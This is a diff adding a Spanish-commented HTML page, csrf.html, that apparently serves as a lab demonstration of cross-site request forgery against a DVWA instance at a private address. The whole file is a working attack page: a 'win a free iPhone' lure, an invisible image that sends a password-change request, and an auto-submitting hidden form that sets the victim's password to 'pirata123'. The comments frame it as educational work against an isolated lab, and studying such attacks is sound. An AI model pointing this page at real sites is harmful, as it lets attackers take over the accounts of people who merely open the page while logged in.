@@ -1,0 +1,26 @@
+<!--
+  csrf.html -- Pagina TRAMPA de ejemplo (CSRF). Asi es como un atacante esconde la
+  peticion forjada: la victima solo tiene que ABRIR esta pagina mientras tiene la
+  sesion de DVWA iniciada, y su navegador enviara la peticion con SU cookie, cambiando
+  su contrasena sin que toque nada.
+  SOLO para fines educativos y contra MI laboratorio aislado. Morini Computers.
+-->
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="utf-8"><title>Gana un iPhone gratis</title></head>
+<body>
+  <h1>Cargando tu premio...</h1>
+
+  <!-- Variante 1: una imagen invisible dispara la peticion GET al instante -->
+  <img src="http://10.13.37.30/vulnerabilities/csrf/?password_new=pirata123&password_conf=pirata123&Change=Change"
+       width="0" height="0" alt="">
+
+  <!-- Variante 2: un formulario que se autoenvia (sirve tambien para peticiones POST) -->
+  <form id="f" action="http://10.13.37.30/vulnerabilities/csrf/" method="GET">
+    <input type="hidden" name="password_new"  value="pirata123">
+    <input type="hidden" name="password_conf" value="pirata123">
+    <input type="hidden" name="Change"        value="Change">
+  </form>
+  <script>document.getElementById('f').submit();</script>
+</body>
+</html>
